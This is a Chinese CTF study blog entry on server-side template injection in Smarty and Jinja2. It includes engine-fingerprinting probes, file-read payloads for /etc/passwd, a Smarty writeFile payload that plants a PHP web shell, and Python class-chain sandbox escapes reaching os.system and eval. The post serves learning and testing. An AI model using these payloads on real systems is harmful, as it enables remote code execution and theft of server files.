        <tag>-Web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI漏洞</title>
    <url>/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="SSTI（模板注入）漏洞"><a href="#SSTI（模板注入）漏洞" class="headerlink" title="SSTI（模板注入）漏洞"></a>SSTI（模板注入）漏洞</h1><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
<h2 id="模板注入漏洞"><a href="#模板注入漏洞" class="headerlink" title="模板注入漏洞"></a>模板注入漏洞</h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p>
<p>当前使用的一些框架，比如python的<code>flask</code>，php的<code>tp</code>，java的<code>spring</code>等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>
<p>漏洞成因就是服务端接收了用户的恶意输入(一般来说是用户输入的变量)以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
<h2 id="确定攻击方式"><a href="#确定攻击方式" class="headerlink" title="确定攻击方式"></a>确定攻击方式</h2><h3 id="第一层："><a href="#第一层：" class="headerlink" title="第一层："></a>第一层：</h3><ul>
<li>如果可以执行${7*7}的结果，那我们进入第二层的<code>a&#123;*comment*&#125;b</code>，如果没用执行结果，那就进入第二层的<code>&#123;&#123;7*7&#125;&#125;</code></li>
<li>在Mako模板引擎中我们也是${}形式的</li>
</ul>
<h3 id="第二层："><a href="#第二层：" class="headerlink" title="第二层："></a>第二层：</h3><ul>
<li>在<code>a&#123;*comment*&#125;b</code>中，如果{**}被当作注释而输出ab，我们就可以确定这个地方是Smarty模板，如果不能，进入第三层；</li>
<li>在<code>&#123;&#123;7*7&#125;&#125;</code>中，如果能够执行，那我们进入第三层。</li>
</ul>
<h3 id="第三层："><a href="#第三层：" class="headerlink" title="第三层："></a>第三层：</h3><ul>
<li>当49的结果为49时，对应着Twig模板类型，而结果如果为7777777，则对应着Jinja2的模板类型</li>
<li>当能够执行<code>$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;</code>,我们就能确定是Mako模板，能够直接执行python命令.</li>
</ul>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>php常见的模板：twig，smarty，blade</p>
<h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>PHP模板的鼻祖，后来的php模板大多都是基于其发展起来的</p>
<p>基本确定指令</p>
<pre><code class="highlight php">&#123;<span class="variable">$smarty</span>.version&#125; <span class="comment">//查看smarty的版本来确定姿势</span></code></pre>

<p>说实话，smarty的姿势还是蛮多的，先给三种比较常见的吧</p>
<ul>
<li><p>基于XFF的普通注入:在{}内疯狂输出</p>
</li>
<li><p>利用{include}来任意文件读取；string:{include file&#x3D;’D:\flag.txt’}这时文本内容就被读取了</p>
</li>
</ul>
<h4 id="通过self获取Smarty类再调用其静态方法"><a href="#通过self获取Smarty类再调用其静态方法" class="headerlink" title="通过self获取Smarty类再调用其静态方法"></a><strong>通过self获取Smarty类再调用其静态方法</strong></h4><p><strong>getStreamVariable:</strong></p>
<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)//<span class="title">variable</span>其实就是文件路径</span>
<span class="function"></span>&#123;
        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;
        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);<span class="comment">//从此处开始对文件进行读取</span>
        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;
            <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;
                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;
            &#125;
            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);
            <span class="keyword">return</span> <span class="variable">$_result</span>;
        &#125;
        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;
        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;
            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);
        &#125; <span class="keyword">else</span> &#123;
            <span class="keyword">return</span> <span class="literal">null</span>;
        &#125;
    &#125;
<span class="comment">//可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法</span>
smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　<span class="title function_ invoke__">getStreamVariable</span>() 这个方法可以获取传入变量的流
例如：
&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</code></pre>

<p>payload形如：<code>&#123;self::getStreamVariable(“file:///etc/passwd”)&#125;</code> &#x2F;&#x2F;在v3.1.30退出历史舞台</p>
<p><strong>writeFile：</strong></p>
<p>这个不是很懂，直接引用这个大佬的博客吧</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250307213236244.png" alt="image-20250307213236244"></p>
<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable">$_error_reporting</span> = <span class="title function_ invoke__">error_reporting</span>();
        <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);
        <span class="variable">$_file_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_file_perms&#x27;</span>) ? <span class="variable">$smarty</span>-&gt;_file_perms : <span class="number">0644</span>;
        <span class="variable">$_dir_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_dir_perms&#x27;</span>) ? (<span class="keyword">isset</span>(<span class="variable">$smarty</span>-&gt;_dir_perms) ? <span class="variable">$smarty</span>-&gt;_dir_perms : <span class="number">0777</span>)  : <span class="number">0771</span>;
        <span class="keyword">if</span> (<span class="variable">$_file_perms</span> !== <span class="literal">null</span>) &#123;
            <span class="variable">$old_umask</span> = <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);
        &#125;

        <span class="variable">$_dirpath</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_filepath</span>);
        <span class="comment">// if subdirs, create dir structure</span>
        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_dirpath</span>)) &#123;
            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$_dirpath</span>, <span class="variable">$_dir_perms</span>, <span class="literal">true</span>);
        &#125;

        <span class="comment">// write to tmp file, then move to overt file lock race condition</span>
        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));
        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
       &#125;</code></pre>

<p>我们在往上面看，可以看到这个方法是在<code>class Smarty_Internal_Runtime_WriteFile</code>下的，</p>
<p>我们注意看这段代码</p>
<pre><code class="highlight php"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
       &#125;</code></pre>

<p>这段代码将文件内容写入临时文件，如果写入失败，则恢复先前的错误报告级别，并抛出异常。</p>
<p>这里的具体解释我会在下面的CVE-2017-1000480具体讲到，先挖个坑，这里写入临时文件，在loadCompiledTemplate函数下，存在语句</p>
<pre><code class="highlight php"><span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filepath));</code></pre>

<p>就有了</p>
<pre><code class="highlight php">&#123;<span class="title class_">Smarty_Internal_Write_File</span>::<span class="title function_ invoke__">writeFile</span>(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php passthru(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::<span class="title function_ invoke__">clearConfig</span>())&#125;</code></pre>

<p>我们将<code>&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;</code>写入了临时php文件中</p>
<p><code>self::clearConfig()</code> 是一个 Smarty 内部方法，用于清除模板引擎的配置选项。</p>
<p><code>$SCRIPT_NAME</code> 是一个在 PHP 中预定义的变量，用于表示当前执行脚本的文件路径和名称。</p>
<p>但是writeFile方法也有版本限制，所以我们首先要确定模板的版本，再决定对应的攻击方法。</p>
<h4 id="标签"><a href="#标签" class="headerlink" title="标签:"></a>标签:</h4><p><strong>{$smarty.version}</strong></p>
<p>获取smarty的版本信息</p>
<p><strong>{literal}</strong></p>
<p>此标签的利用方法仅仅是在php5.x的版本中才可以使用，因为在 PHP5 环境下存在一种 PHP 标签， <code>&lt;script&gt;language=&quot;php&quot;&gt;&lt;/script&gt;，</code>我们便可以利用这一标签进行任意的 PHP 代码执行。但是在php7的版本中<code>&#123;literal&#125;xxxx;&#123;/literal&#125;</code>标签中间的内容就会被原封不动的输出，并不会解析。</p>
<p>作用：{literal} 可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为 Smarty 的定界符而错被解析。</p>
<p>所以我们就可以利用其的作用来进行xss攻击SSTI等漏洞利用。</p>
<pre><code class="highlight php">&#123;literal&#125;&lt;script&gt;language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;;&#123;/literal&#125;</code></pre>

<p><strong>{php}{&#x2F;php}</strong></p>
<p>用于执行php代码</p>
<pre><code class="highlight php">&#123;php&#125;<span class="title function_ invoke__">phpinfo</span>();&#123;/php&#125;</code></pre>

<p>但是这个方法在Smarty3版本中已经被禁用了，不过多赘述了。</p>
<p><strong>{if}{&#x2F;if}</strong></p>
<pre><code class="highlight php">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;
&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;
<span class="comment">//Smarty的&#123;if&#125;条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &amp;&amp;, and, is_array(), 等等，如：&#123;if is_array($array)&#125;&#123;/if&#125;*</span></code></pre>

<h3 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h3><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>python常见的模板有：Jinja2，tornado</p>
<p>贴一下框架的判断方法</p>
<pre><code class="highlight plaintext">&#123;7*7&#125; -&gt;49 -&gt; smarty

&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; 49 -&gt; twig

&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; 7777777 -&gt; jinjia2</code></pre>

<p><strong>模糊测试:</strong></p>
<p><code>class</code><br><code>bases</code><br><code>mro</code><br><code>subclasses</code><br><code>getitem</code><br><code>init</code><br><code>globals</code><br><code>builtins</code><br><code>import</code><br><code>url_for</code><br><code>lipsum</code><br><code>config</code><br><code>popen</code><br><code>request</code><br><code>&#39;&#39;</code><br><code>&quot;&quot;</code><br><code>[]</code><br><code>()</code><br><code>.</code><br><code>+</code><br><code>_</code></p>
<p><code>0-9</code><br><code>$</code><br><code>%</code></p>
<p>在后续的攻击中，一般会有大量的过滤，这里需要搞一下类之间的继承关系，通过继承关系的不断调用来达到RCE的目的(这里参考了其他师傅的博客)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/12b88699f2f17cdb66c96df653330b03.png" alt="img"></p>
<p>可以看到我们创建了4个类，其中的B类继承了A类，C、D类继承了B类,如果我们在这创建一个C的对象c，那么我们就可以通过<code>__class__</code>魔术方法来找到它的当前类</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/32629cc50bef871c175ff2cb97ba6987.png" alt="img"></p>
<p>可以看到它返回了一个当前的类为C，我们还可以通过<code>__base__</code>这个魔术方法来找到当前类的父类</p>
<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2fbe9f85aa0cf607d5d5fcc88271531a.png" alt="img" style="zoom: 80%;">

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/8c05f226639630b4d4ad107563d1c0c3.png" alt="img" style="zoom:80%;"><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/7d5077f18454f36e57b3f115a9bd759d.png" alt="img" style="zoom:80%;"></p>
<p>这样就可以一步步叠上去，找到上面所有父类</p>
<p>C-&gt;B-&gt;A-&gt;Object</p>
<p>当然，你也可以直接用<code>__mor__</code>魔术方法以数组形式返回所有父类</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/d5a6a4672f9a1ccbfd8243b789e792ad.png" alt="img"></p>
<p>拿到object类后就可以用<code>__subclasses__()</code>得到当前类的所有子类</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/24edbadb9ad62466cff298486ae13f07.png" alt="img"></p>
<p>跟前面的<code>__mro__</code>魔术方法一样是用数组表示的，可以用下标找到对应的类。接下来我们给这个类进行一些初始化方法<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/a1580dabda5d7e8c5650908f99c21b90.png" alt="img">初始化方法后可以通过<code>__globals__</code>魔术方法来返回当前类方法中的全局变量字典，可能有一点点抽象，我也不太懂具体是返回什么，但是大致就是返回当前类的全局变量<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/a57a84281c102d35a1952386499a3bd4.png" alt="img">可以发现很多全局变量都在里面，我们需要最后能够进行<code>rce</code>，因此应该找到能执行系统命令的方法，这里用<code>popen</code>函数来执行系统命令，在后面加上具体的函数名即可找到对应的函数<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1349cff6c89f458812eff436f68c7b41.png" alt="img"> 我们执行一下shell命令，这里执行一下<code>whoami</code>，这里一定要记得用.read()来读取一下，因为<code>popen</code>方法返回的是一个与子进程通信的对象，为了从该对象中获取子进程的输出，因此需要使用read()方法来读取子进程的输出】。<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/5c13d7c7df91b9d0be15f9e52b194454.png" alt="img">可以发现成功执行系统命令，这里我们就其实通过类的继承关系里大致讲完了SSTI的一个攻击的思路。</p>
<p>接下来让我们进入正题</p>
<h3 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h3><h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><p>Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的</p>
<p>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了  块</p>
<p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p>
<p>Jinja2 模板同样支持控制语句，像在 <code>&#123;%…%&#125; </code>块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子:</p>
<p><code>&lt;ul&gt;     &#123;% for comment in comments %&#125;
         <li>&#123;&#123;comment&#125;&#125;</li>
    &#123;% endfor %&#125;&lt;ul&gt;</code></p>
<p>另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值</p>
<pre><code class="highlight html">Hello, &#123;&#123;name|capitalize&#125;&#125;</code></pre>

<p>但是这只能在渲染前的模板中进行注入，如果模板已经渲染，就不存在模板注入了:</p>
<pre><code class="highlight plaintext">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get(&#x27;name&#x27;, &#x27;guest&#x27;)

    t = Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)
    return t.render(n=name)

if __name__ == &quot;__main__&quot;:
    app.run()</code></pre>

<p>编译运行，再次注入就会失败<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1344396-20200903151308616-823367288.png" alt="img"></p>
<h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><pre><code class="highlight plaintext">__dict__　　 ：保存类实例或对象实例的属性变量键值对字典
__class__　　：返回一个实例所属的类
__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）
__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组
// __base__和__mro__都是用来寻找基类的
__subclasses__　　：以列表返回类的子类
__init__　　 ：类的初始化方法
__globals__　　   ：对包含函数全局变量的字典的引用_
_builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　
这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　
在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　
1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　
2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</code></pre>

<p>一般我们会看到<code>&#39;&#39;.__class__;().__class__;[].__class__;&quot;&quot;.__class__;&#123;&#125;.__class__</code>几种方法起手，究竟是什么意思捏</p>
<p>其实是通过最简单数据类型的类来获取元类(Object)</p>
<p><strong>利用file对象读取文件(Python2)</strong></p>
<pre><code class="highlight plaintext">for c in &#123;&#125;.__class__.__base__.__subclasses__():
    if(c.__name__==&#x27;file&#x27;):
        print(c)
        print c(&#x27;joker.txt&#x27;).readlines()</code></pre>

<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903153121082-520901024.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903153121082-520901024.png" alt="img"></a></p>
<p>上述代码先通过<code>__class__</code>获取字典对象所属的类，再通过<code>__base__</code>（<code>__bases[0]__</code>）拿到基类，然后使用<code>__subclasses__()</code>获取子类列表，在子类列表中直接寻找可以利用的类</p>
<p>为了方便理解，我直接把获取到的子类列表打印出来：</p>
<pre><code class="highlight plaintext">for c in &#123;&#125;.__class__.__base__.__subclasses__():
        print(c)</code></pre>

<p> 打印结果如下（python2.7.5）：</p>
<pre><code class="highlight plaintext">&lt;type &#x27;type&#x27;&gt;
&lt;type &#x27;weakref&#x27;&gt;
&lt;type &#x27;weakcallableproxy&#x27;&gt;
&lt;type &#x27;weakproxy&#x27;&gt;
&lt;type &#x27;int&#x27;&gt;
&lt;type &#x27;basestring&#x27;&gt;
&lt;type &#x27;bytearray&#x27;&gt;
&lt;type &#x27;list&#x27;&gt;
&lt;type &#x27;NoneType&#x27;&gt;
&lt;type &#x27;NotImplementedType&#x27;&gt;
&lt;type &#x27;traceback&#x27;&gt;
&lt;type &#x27;super&#x27;&gt;
&lt;type &#x27;xrange&#x27;&gt;
&lt;type &#x27;dict&#x27;&gt;
&lt;type &#x27;set&#x27;&gt;
&lt;type &#x27;slice&#x27;&gt;
&lt;type &#x27;staticmethod&#x27;&gt;
&lt;type &#x27;complex&#x27;&gt;
&lt;type &#x27;float&#x27;&gt;
&lt;type &#x27;buffer&#x27;&gt;
&lt;type &#x27;long&#x27;&gt;
&lt;type &#x27;frozenset&#x27;&gt;
&lt;type &#x27;property&#x27;&gt;
&lt;type &#x27;memoryview&#x27;&gt;
&lt;type &#x27;tuple&#x27;&gt;
&lt;type &#x27;enumerate&#x27;&gt;
&lt;type &#x27;reversed&#x27;&gt;
&lt;type &#x27;code&#x27;&gt;
&lt;type &#x27;frame&#x27;&gt;
&lt;type &#x27;builtin_function_or_method&#x27;&gt;
&lt;type &#x27;instancemethod&#x27;&gt;
&lt;type &#x27;function&#x27;&gt;
&lt;type &#x27;classobj&#x27;&gt;
&lt;type &#x27;dictproxy&#x27;&gt;
&lt;type &#x27;generator&#x27;&gt;
&lt;type &#x27;getset_descriptor&#x27;&gt;
&lt;type &#x27;wrapper_descriptor&#x27;&gt;
&lt;type &#x27;instance&#x27;&gt;
&lt;type &#x27;ellipsis&#x27;&gt;
&lt;type &#x27;member_descriptor&#x27;&gt;
&lt;type &#x27;file&#x27;&gt;
&lt;type &#x27;PyCapsule&#x27;&gt;
&lt;type &#x27;cell&#x27;&gt;
&lt;type &#x27;callable-iterator&#x27;&gt;
&lt;type &#x27;iterator&#x27;&gt;
&lt;type &#x27;sys.long_info&#x27;&gt;
&lt;type &#x27;sys.float_info&#x27;&gt;
&lt;type &#x27;EncodingMap&#x27;&gt;
&lt;type &#x27;fieldnameiterator&#x27;&gt;
&lt;type &#x27;formatteriterator&#x27;&gt;
&lt;type &#x27;sys.version_info&#x27;&gt;
&lt;type &#x27;sys.flags&#x27;&gt;
&lt;type &#x27;exceptions.BaseException&#x27;&gt;
&lt;type &#x27;module&#x27;&gt;
&lt;type &#x27;imp.NullImporter&#x27;&gt;
&lt;type &#x27;zipimport.zipimporter&#x27;&gt;
&lt;type &#x27;posix.stat_result&#x27;&gt;
&lt;type &#x27;posix.statvfs_result&#x27;&gt;
&lt;class &#x27;warnings.WarningMessage&#x27;&gt;
&lt;class &#x27;warnings.catch_warnings&#x27;&gt;
&lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;
&lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;
&lt;class &#x27;_abcoll.Hashable&#x27;&gt;
&lt;type &#x27;classmethod&#x27;&gt;
&lt;class &#x27;_abcoll.Iterable&#x27;&gt;
&lt;class &#x27;_abcoll.Sized&#x27;&gt;
&lt;class &#x27;_abcoll.Container&#x27;&gt;
&lt;class &#x27;_abcoll.Callable&#x27;&gt;
&lt;class &#x27;site._Printer&#x27;&gt;
&lt;class &#x27;site._Helper&#x27;&gt;
&lt;type &#x27;_sre.SRE_Pattern&#x27;&gt;
&lt;type &#x27;_sre.SRE_Match&#x27;&gt;
&lt;type &#x27;_sre.SRE_Scanner&#x27;&gt;
&lt;class &#x27;site.Quitter&#x27;&gt;
&lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;
&lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;</code></pre>

<p>使用dir来看一下file这个子类的内置方法：</p>
<pre><code class="highlight plaintext">dir(().__class__.__bases__[0].__subclasses__()[40])</code></pre>

<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162108171-343241811.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162108171-343241811.png" alt="img"></a></p>
<p>将要读取的文件传进入并使用readlines()方法读取，就相当于：</p>
<pre><code class="highlight plaintext">file(&#x27;joker.txt&#x27;).readlines()</code></pre>

<p>可以在python交互终端中尝试输出：</p>
<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185622152-2036123666.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185622152-2036123666.png" alt="img"></a></p>
<p>再使用jinja2的语法封装成可解析的样子：</p>
<pre><code class="highlight plaintext">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__==&#x27;file&#x27; %&#125;
&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;</code></pre>

<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162635283-101719007.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162635283-101719007.png" alt="img"></a></p>
<p>不过我这边一直没有读取成功，原因是：<strong>python3已经移除了file。所以利用file子类文件读取只能在python2中用。</strong></p>
<p>docker容器默认使用python3版本</p>
<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903163434739-57279547.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903163434739-57279547.png" alt="img"></a></p>
<p><strong>用内置模块执行命令</strong></p>
<p>上面的实例中我们使用dir把内置的对象列举出来，其实可以用<code>__globals__</code>更深入的去看每个类可以调用的东西（包括模块，类，变量等等），如果有<code>os</code>这种可以直接传入命令，造成命令执行</p>
<pre><code class="highlight plaintext">#coding:utf-8search = &#x27;os&#x27;   #也可以是其他你想利用的模块
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass</code></pre>

<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903164854386-1155449135.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903164854386-1155449135.png" alt="img"></a></p>
<p>可以看到在元组68，73的位置找到了os方法，这样就可以构造命令执行payload:</p>
<pre><code class="highlight plaintext">().__class__.__bases__[0].__subclasses__()[68].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)
().__class__.__base__.__subclasses__()[73].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)
().__class__.__mro__[1].__subclasses__()[68].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)
().__class__.__mro__[1].__subclasses__()[73].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)</code></pre>

<p>在python交互终端中尝试输出：</p>
<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185803928-864364882.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185803928-864364882.png" alt="img"></a></p>
<p><strong>不过同样，只能在python2版本使用</strong></p>
<p>这时候就要推荐<code>__builtins__</code>：</p>
<pre><code class="highlight plaintext">#coding:utf-8

search = &#x27;__builtins__&#x27;
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        print(i.__init__.__globals__.keys())
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass</code></pre>

<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193619159-1700547757.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193619159-1700547757.png" alt="img"></a></p>
<p>这时候我们的命令执行payload就出来了：<br>python3：</p>
<pre><code class="highlight plaintext">().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</code></pre>

<p>python2：</p>
<pre><code class="highlight plaintext">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</code></pre>

<p>在python交互终端中尝试输出：</p>
<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193824030-649565108.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193824030-649565108.png" alt="img">   </a></p>
<p>实际注入效果：</p>
